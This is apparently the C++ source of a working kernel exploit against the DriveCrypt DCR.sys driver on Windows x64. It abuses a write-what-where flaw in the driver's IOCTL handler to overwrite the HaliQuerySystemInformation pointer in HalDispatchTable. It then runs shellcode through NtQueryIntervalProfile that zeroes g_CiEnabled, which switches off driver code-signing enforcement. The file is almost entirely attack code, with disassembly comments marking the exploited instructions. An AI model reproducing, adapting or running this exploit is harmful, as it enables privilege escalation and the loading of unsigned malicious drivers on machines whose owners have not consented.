// DriveCrypt.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "DriveCrypt.h"
#include "Log.h"

// TODO : FIX WHAT YOU FUCKED UP! HAL DISPATCH TABLE ASSHOLE!!!!

int main(int argc, char **argv)
{
	_NtQueryIntervalProfile NtQueryIntervalProfile;
	IOCTL_REQ				IoctlRequest;
	HANDLE					hDcrFileHandle;
	HMODULE					hNtOsHandle;
	HMODULE					hHalHanlde;
	CHAR					DriverString[PAYLOAD_SIZE];
	CHAR					KernelImageName[MAX_PATH];
	DWORD					dwReturnLen;
	DWORD					dwWrite;
	ULONG_PTR				KernelBaseAddress;
	ULONG_PTR				HalBaseAddress;
	ULONG_PTR				DCRBaseAddress;
	ULONG_PTR				HalDispatchTable;
	ULONG_PTR				HaliQuerySystemInformationPointer;
	ULONG_PTR				HaliQuerySystemInformation;
	ULONG_PTR				g_CiEnabled;
	BYTE					ShellcodeCiEnabledAddress[8];
	BOOL					Result;
	ERRORINFO				err;

	// get NtQueryIntervalProfile address, 
	// we will overwrite a hal pointer which used in this function.
	NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle("NTDLL"), "NtQueryIntervalProfile");
	if ( NtQueryIntervalProfile == NULL )
	{
		REPORT_ERROR("GetProcAddress()", &err);
		return FALSE;
	}

	// get kernel base address, we need it calculate 
	// functions and variables address inside the loaded kernel.
	if ( !GetKernelBaseInfo( &KernelBaseAddress, KernelImageName, MAX_PATH) )
	{
		DEBUG_PRINTF(L_ERROR,"Faild to get kernel base address.");
		return FALSE;
	}

	// check id DCR.sys loaded or not by getting its base address
	if ( !GetDriverImageBase( &DCRBaseAddress, "DCR") )
	{
		DEBUG_PRINTF(L_ERROR,"Faild to get DCR.sys base address.");
		return FALSE;
	}

	// get hal.dll base address, we need it calculate 
	// functions and variables address inside the loaded hal. 
	if ( !GetDriverImageBase( &HalBaseAddress, "hal") )
	{
		DEBUG_PRINTF(L_ERROR,"Faild to get hal.dll base address.");
		return FALSE;
	}

	// load kernel from user-mode
	hNtOsHandle = LoadLibrary( KernelImageName );
	if ( hNtOsHandle == NULL )
	{
		REPORT_ERROR("LoadLibrary()", &err);
		return FALSE;
	}

	// get nt!HalDispatchTable address , it is exported by kernel.
	HalDispatchTable = KernelGetProcAddress( (ULONG_PTR)hNtOsHandle, KernelBaseAddress, "HalDispatchTable" );
	if ( HalDispatchTable == NULL )
	{
		REPORT_ERROR("KernelGetProcAddress()", &err);
		return FALSE;
	}

	DEBUG_PRINTF(L_INFO, "HalDispatchTable at : %p", HalDispatchTable );
	// HaliQuerySystemInformation pointer reside in HalDispatchTable+8,
	// this pointer is used inside NtQueryIntervalProfile->KeQueryIntervalProfile.
	// we will overwrite it with our payload address.
	HaliQuerySystemInformationPointer = HalDispatchTable+0x8;
	DEBUG_PRINTF(L_INFO, "HaliQuerySystemInformation Pointer at : %p", HaliQuerySystemInformationPointer );

	// g_CiEnabled is the key viarble used for Disable/Enable
	// Windows x64 Code Signing Policy. it is used inside SeValidateImageHeader,
	// if we set this vaiable to 0, kernel doesnt check driver is signed or not.
	if ( ( g_CiEnabled = GetCiEnabledAddress(hNtOsHandle) ) == NULL )
	{
		DEBUG_PRINTF(L_INFO, "Faild to get g_CiEnabled address.");
		return FALSE;
	}

	// make its address absolute 
	g_CiEnabled = g_CiEnabled - (ULONG_PTR)hNtOsHandle + (ULONG_PTR)KernelBaseAddress;
	DEBUG_PRINTF(L_INFO, "g_CiEnabled Pointer at : %p", g_CiEnabled );

	// fix the shellcode with g_CiEnabled address
	for ( DWORD i = 0; i <=7; i++ ) ShellcodeCiEnabledAddress[i] = (byte)( ( g_CiEnabled >> ( i * 8 ) ) & 0x00000000000000FF );
	RtlCopyMemory( DisableCodeSigning+2, ShellcodeCiEnabledAddress, sizeof(ShellcodeCiEnabledAddress) );
	
	// open a handle to DCR driver.
	hDcrFileHandle = CreateFileA ( "\\\\.\\DCR", 
									FILE_EXECUTE,
									FILE_SHARE_READ|FILE_SHARE_WRITE, 
									NULL,
									OPEN_EXISTING, 
									0,
									NULL);

	if ( hDcrFileHandle == INVALID_HANDLE_VALUE)
	{
		REPORT_ERROR("CreateFile()",&err);
		return FALSE;
	}

	// set up request , this just get the driver version 
	// and its build time to check the driver is available for use.
	SecureZeroMemory( &IoctlRequest, sizeof(IOCTL_REQ));
	IoctlRequest.Action = DCR_ACTION_ENABLE;
	IoctlRequest.Flag = 0;
	IoctlRequest.Buffer = (ULONG_PTR)DriverString;

	// just send the IOCTL
	DEBUG_PRINTF(L_INFO, "Enabling DCR Driver.");
	Result = DeviceIoControl( hDcrFileHandle, 
                              DCR_IOCTL, 
                              &IoctlRequest, 
                              sizeof(IOCTL_REQ), 
                              &IoctlRequest, 
                              sizeof(IOCTL_REQ),
                              &dwReturnLen,
                              0);
	if ( Result == FALSE )
	{
		REPORT_ERROR("DeviceIoControl()",&err);
		return FALSE;
	}

	// report driver information.
	DEBUG_PRINTF(L_INFO, "Driver Version: 0x%08X [%s], %s", *(int *) &DriverString[8], &DriverString[12], &DriverString[19]);

	// setup the request to trigger the vul,
	// driver suffers from many vulnerabilities,
	// I just choose a write4 inside the IOCTL handler function 
	//.text:0000000000022A39                 mov     rax, [rsp+1058h+arg_0] ; jumptable 0000000000022A2D case 19
	//.text:0000000000022A41                 mov     rax, [rax+8]
	//.text:0000000000022A45                 mov     [rsp+1058h+var_FD8], rax
	//.text:0000000000022A4D                 mov     rax, [rsp+1058h+arg_0]
	//.text:0000000000022A55                 mov     rax, [rax+18h]
	//.text:0000000000022A59                 mov     [rsp+1058h+var_FE0], rax
	//.text:0000000000022A5E                 mov     rax, [rsp+1058h+var_FF0] ; controled by attacker
	//.text:0000000000022A63                 add     rax, 0Ch
	//.text:0000000000022A67                 mov     rcx, [rsp+1058h+var_FD8] ; controled by attacker
	//.text:0000000000022A6F                 mov     [rcx], rax      ; pwn!!!
	//.text:0000000000022A72                 cmp     cs:dword_55704, 0
	//.text:0000000000022A79                 jnz     short loc_22A87
	SecureZeroMemory( &IoctlRequest, sizeof(IOCTL_REQ));
	IoctlRequest.Action = DCR_ACTION_TRIGGER;
	IoctlRequest.Flag = 0;
	IoctlRequest.Buffer = (ULONG_PTR)DriverString;
	IoctlRequest.TargetAddress = HaliQuerySystemInformationPointer;
	IoctlRequest.SecondWrite = (ULONG_PTR)&dwWrite;

	DEBUG_PRINTF(L_INFO,"Press anykey to trigger...");getchar();

	// just send the IOCTL
	Result = DeviceIoControl ( hDcrFileHandle, 
                               DCR_IOCTL, 
                               &IoctlRequest, 
                               sizeof(IOCTL_REQ), 
                               &IoctlRequest, 
                               sizeof(IOCTL_REQ),
                               &dwReturnLen,
                               0);

	if ( Result == FALSE )
	{
		REPORT_ERROR("DeviceIoControl()",&err);
		return FALSE;
	}

	// fill payload address with NOP,
	// and copy actual payload into it,
	RtlFillMemory( DriverString, 1024, 0x90 );
	RtlCopyMemory( DriverString+0x100, DisableCodeSigning, sizeof(DisableCodeSigning) );

	// make it executable.
	if ( !VirtualProtect( DriverString, 1024, PAGE_EXECUTE_READWRITE, &dwWrite) )
	{
		REPORT_ERROR("VirtualProtect()",&err);
		return FALSE;
	}

	// this call will trigger the payload and disbale the CSP.
	// KeQueryIntervalProfile+13 :
	//PAGE:00000001403EC812                 mov     [rsp+38h+var_18], ecx
	//PAGE:00000001403EC816                 lea     r9, [rsp+38h+arg_0]
	//PAGE:00000001403EC81B                 lea     ecx, [rdx-0Bh]
	//PAGE:00000001403EC81E                 lea     r8, [rsp+38h+var_18]
	//PAGE:00000001403EC823                 call    cs:off_1401F1C68 <== PWN!!!
	//PAGE:00000001403EC829                 test    eax, eax
	//PAGE:00000001403EC82B                 js      short loc_1403EC83A
	NtQueryIntervalProfile(ProfileTotalIssues, &dwWrite);
	CloseHandle(hDcrFileHandle);
	return TRUE;
}